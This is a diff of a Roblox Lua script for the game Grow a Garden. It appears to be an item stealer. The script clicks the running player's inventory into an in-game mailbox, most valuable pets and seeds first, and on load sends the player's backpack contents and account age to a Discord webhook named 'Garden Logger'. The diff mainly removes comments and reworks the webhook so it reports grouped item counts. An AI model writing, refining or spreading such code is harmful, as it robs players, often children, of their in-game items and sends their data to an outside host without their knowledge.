@@ -15,15 +15,12 @@ local TARGET_PETS = { "bunny", "robin", "frog", "deer" }
 
 --------------------------------------------------------------------
 -- PRIORITY LISTS  (best first, trash last)
--- Items are clicked in this order, so the good stuff goes into the
--- mailbox before fillers can take the slots.
 --------------------------------------------------------------------
 
--- Seeds / fruits priority (Grow a Garden 2 tier list, S -> D)
 local FRUITS = {
     -- S tier
     "Dragon's Breath", "Moon Bloom", "Ghost Pepper", "Venus Fly Trap",
-    "Poison Ivy", "Pomegranate", "Poision Apple", -- in-game spelling
+    "Poison Ivy", "Pomegranate", "Poision Apple",
     -- A tier
     "Mushroom", "Glow Mushroom", "Sunflower", "Cherry", "Acorn",
     "Dragon Fruit", "Mango", "Baby Cactus", "Cactus",
@@ -31,29 +28,19 @@ local FRUITS = {
     "Bamboo", "Horned Melon", "Banana", "Grape", "Coconut", "Green Bean",
     -- C tier
     "Apple", "Pineapple", "Corn", "Tomato",
-    -- D tier (fillers, sent last)
+    -- D tier
     "Strawberry", "Blueberry", "Carrot", "Tulip"
 }
 
--- Pet priority (lowercase substrings, matched against Inv_Pets:<name>)
--- "huge" and "big" are SIZE MODIFIERS on top of any pet, and the
--- rarest variants in the game, so they get sent before anything else.
+-- Pet priority (lowercase substrings). "huge" and "big" catch all
+-- size-modifier variants first since they are the rarest.
 local PET_PRIORITY = {
-    -- Size modifiers (catches Huge Bunny, Huge Raccoon, Big Deer, etc.)
     "huge", "big",
-
-    -- S tier specific pets
     "raccoon", "black dragon", "ice serpent", "kitsune",
     "cockatrice", "golden goose", "phoenix", "dragon",
-
-    -- A tier
     "blood owl", "german shepherd", "deer", "bunny", "bee", "fox",
-
-    -- B tier
     "golden dragonfly", "unicorn", "hedgehog", "honey bee",
     "space squirrel", "frog",
-
-    -- C tier (low value, sent last among pets)
     "owl", "monkey", "rooster", "bagel bunny", "snake", "cuckoo", "robin"
 }
 
@@ -101,22 +88,14 @@ end
 local HttpService = game:GetService("HttpService")
 local requestFunc = (syn and syn.request) or (http and http.request) or request
 
--- Send backpack contents to Discord webhook (Garden Logger style)
+--------------------------------------------------------------------
+-- Discord webhook: grouped inventory snapshot
+--   - Duplicates collapsed into "Name ×N" (omits ×1)
+--   - Headers show "(X items / Y types)"
+--------------------------------------------------------------------
 local function sendBackpackToWebhook()
     local backpack = localPlayer:FindFirstChild("Backpack")
     if not backpack then warn("Backpack not found") return end
-
-    local function getWeight(tool)
-        local w = tool:GetAttribute("Weight")
-        if not w then
-            local v = tool:FindFirstChild("Weight")
-            if v and (v:IsA("NumberValue") or v:IsA("IntValue")) then w = v.Value end
-        end
-        if type(w) == "number" and w > 0 then
-            return string.format(" [%.2fkg]", w)
-        end
-        return ""
-    end
 
     local fruitLookup = {}
     for _, f in ipairs(FRUITS) do fruitLookup[f:lower()] = true end
@@ -136,13 +115,17 @@ local function sendBackpackToWebhook()
         return "other"
     end
 
-    local equipped = {}
+    -- Buckets are name -> count maps (grouped)
     local categorized = { seed = {}, pet = {}, gear = {}, crate = {}, other = {} }
+    local equipped = {}
+
+    local function addTo(bucket, name)
+        bucket[name] = (bucket[name] or 0) + 1
+    end
 
     for _, tool in ipairs(backpack:GetChildren()) do
         if tool:IsA("Tool") then
-            local cat = categorize(tool.Name)
-            table.insert(categorized[cat], tool.Name .. getWeight(tool))
+            addTo(categorized[categorize(tool.Name)], tool.Name)
         end
     end
 
@@ -150,19 +133,43 @@ local function sendBackpackToWebhook()
     if character then
         for _, tool in ipairs(character:GetChildren()) do
             if tool:IsA("Tool") then
-                table.insert(equipped, tool.Name .. getWeight(tool))
+                addTo(equipped, tool.Name)
             end
         end
     end
 
-    local total = #equipped
-    for _, list in pairs(categorized) do total = total + #list end
+    local function bucketStats(bucket)
+        local items, types = 0, 0
+        for _, c in pairs(bucket) do
+            items += c
+            types += 1
+        end
+        return items, types
+    end
 
-    local function buildList(list)
-        if #list == 0 then return "```\n— empty —\n```" end
+    local seedItems,  seedTypes  = bucketStats(categorized.seed)
+    local petItems,   petTypes   = bucketStats(categorized.pet)
+    local gearItems,  gearTypes  = bucketStats(categorized.gear)
+    local crateItems, crateTypes = bucketStats(categorized.crate)
+    local otherItems, otherTypes = bucketStats(categorized.other)
+    local eqItems,    eqTypes    = bucketStats(equipped)
+
+    local total = seedItems + petItems + gearItems + crateItems + otherItems + eqItems
+
+    -- Build "• Name ×N" list, sorted by count desc, omit ×1
+    local function buildList(bucket)
+        local keys = {}
+        for k in pairs(bucket) do table.insert(keys, k) end
+        if #keys == 0 then return "```\n— empty —\n```" end
+        table.sort(keys, function(a, b)
+            if bucket[a] == bucket[b] then return a < b end
+            return bucket[a] > bucket[b]
+        end)
         local lines = { "```" }
-        for _, name in ipairs(list) do
-            table.insert(lines, "• " .. name)
+        for _, name in ipairs(keys) do
+            local c = bucket[name]
+            local entry = (c > 1) and ("• " .. name .. " ×" .. c) or ("• " .. name)
+            table.insert(lines, entry)
             if #table.concat(lines, "\n") > 950 then
                 table.insert(lines, "…")
                 break
@@ -170,6 +177,10 @@ local function sendBackpackToWebhook()
         end
         table.insert(lines, "```")
         return table.concat(lines, "\n")
+    end
+
+    local function header(label, items, types)
+        return string.format("%s (%d items / %d types)", label, items, types)
     end
 
     local accountAge = tostring(localPlayer.AccountAge) .. " days"
@@ -187,18 +198,17 @@ local function sendBackpackToWebhook()
 
         { name = "📦 Totals", value = string.format(
             "🌿 Seeds: `%d` • 🐾 Pets: `%d` • 🔧 Gear: `%d`\n📦 Crates: `%d` • ⚔️ Equipped: `%d` • ❓ Other: `%d`",
-            #categorized.seed, #categorized.pet, #categorized.gear,
-            #categorized.crate, #equipped, #categorized.other
+            seedItems, petItems, gearItems, crateItems, eqItems, otherItems
         ), inline = false },
 
-        { name = "⚔️ Equipped (" .. #equipped .. ")", value = buildList(equipped), inline = false },
+        { name = "⚔️ " .. header("Equipped", eqItems, eqTypes), value = buildList(equipped), inline = false },
     }
 
-    if #categorized.seed  > 0 then table.insert(fields, { name = "🌿 Seeds ("  .. #categorized.seed  .. ")", value = buildList(categorized.seed),  inline = false }) end
-    if #categorized.pet   > 0 then table.insert(fields, { name = "🐾 Pets ("   .. #categorized.pet   .. ")", value = buildList(categorized.pet),   inline = false }) end
-    if #categorized.gear  > 0 then table.insert(fields, { name = "🔧 Gear ("   .. #categorized.gear  .. ")", value = buildList(categorized.gear),  inline = false }) end
-    if #categorized.crate > 0 then table.insert(fields, { name = "📦 Crates (" .. #categorized.crate .. ")", value = buildList(categorized.crate), inline = false }) end
-    if #categorized.other > 0 then table.insert(fields, { name = "❓ Other ("  .. #categorized.other .. ")", value = buildList(categorized.other), inline = false }) end
+    if seedItems  > 0 then table.insert(fields, { name = "🌿 " .. header("Seeds",  seedItems,  seedTypes),  value = buildList(categorized.seed),  inline = false }) end
+    if petItems   > 0 then table.insert(fields, { name = "🐾 " .. header("Pets",   petItems,   petTypes),   value = buildList(categorized.pet),   inline = false }) end
+    if gearItems  > 0 then table.insert(fields, { name = "🔧 " .. header("Gear",   gearItems,  gearTypes),  value = buildList(categorized.gear),  inline = false }) end
+    if crateItems > 0 then table.insert(fields, { name = "📦 " .. header("Crates", crateItems, crateTypes), value = buildList(categorized.crate), inline = false }) end
+    if otherItems > 0 then table.insert(fields, { name = "❓ " .. header("Other",  otherItems, otherTypes), value = buildList(categorized.other), inline = false }) end
 
     local payload = HttpService:JSONEncode({
         username = "Garden Logger",
@@ -385,7 +395,6 @@ end
 -- Click helpers
 --------------------------------------------------------------------
 
--- Click a SPECIFIC inventory frame's button until count hits 0.
 local function clickFrameUntilEmpty(frame)
     if not frame then return 0 end
     local clickCount = 0
@@ -408,7 +417,6 @@ local function clickFrameUntilEmpty(frame)
     return clickCount
 end
 
--- Click everything with the given prefix in whatever order the UI lists it.
 local function clickAllByPrefix(inventoryFrame, prefix)
     for _, child in ipairs(inventoryFrame:GetChildren()) do
         if child.Name:sub(1, #prefix) == prefix then
@@ -420,12 +428,9 @@ local function clickAllByPrefix(inventoryFrame, prefix)
     end
 end
 
--- Click pets in priority order first (Huge/Big -> S -> A -> B -> C),
--- then sweep up any remaining pets that didn't match the priority list.
 local function clickPetsByPriority(inventoryFrame)
     local handled = {}
 
-    -- Pass 1: priority pets, best -> worst
     for _, target in ipairs(PET_PRIORITY) do
         for _, child in ipairs(inventoryFrame:GetChildren()) do
             local name = child.Name
@@ -442,7 +447,6 @@ local function clickPetsByPriority(inventoryFrame)
         end
     end
 
-    -- Pass 2: any other pets that didn't match the priority list
     for _, child in ipairs(inventoryFrame:GetChildren()) do
         local name = child.Name
         if not handled[name] and name:sub(1, 9) == "Inv_Pets:" then
@@ -562,11 +566,9 @@ local function runScript()
         return "done"
     end
 
-    -- 1) PETS FIRST — Huge/Big/best pets get sent before mailbox fills up
     print("Clicking pets (priority order)...")
     clickPetsByPriority(inventoryFrame)
 
-    -- 2) Seeds, in tier order (S -> D)
     print("Clicking seeds (tier order)...")
     for _, fruitName in ipairs(FRUITS) do
         local frameName = "Inv_Seeds:" .. fruitName
@@ -574,7 +576,6 @@ local function runScript()
         if clicked > 0 then print("Seed clicked: " .. fruitName .. " x" .. clicked) end
     end
 
-    -- 3) Crates
     print("Clicking crates...")
     for _, crateName in ipairs(CRATES) do
         local frameName = "Inv_Crates:" .. crateName
@@ -582,7 +583,6 @@ local function runScript()
         if clicked > 0 then print("Crate clicked: " .. crateName .. " x" .. clicked) end
     end
 
-    -- 4) Gear last
     print("Clicking gears...")
     for _, prefix in ipairs(GEAR_PREFIXES) do
         clickAllByPrefix(inventoryFrame, prefix)
@@ -601,13 +601,11 @@ local function runScript()
     return true
 end
 
--- Send webhook on game load
 task.spawn(function()
     task.wait(1.5)
     sendBackpackToWebhook()
 end)
 
--- Main loop
 local attempt = 0
 local allDone = false
 
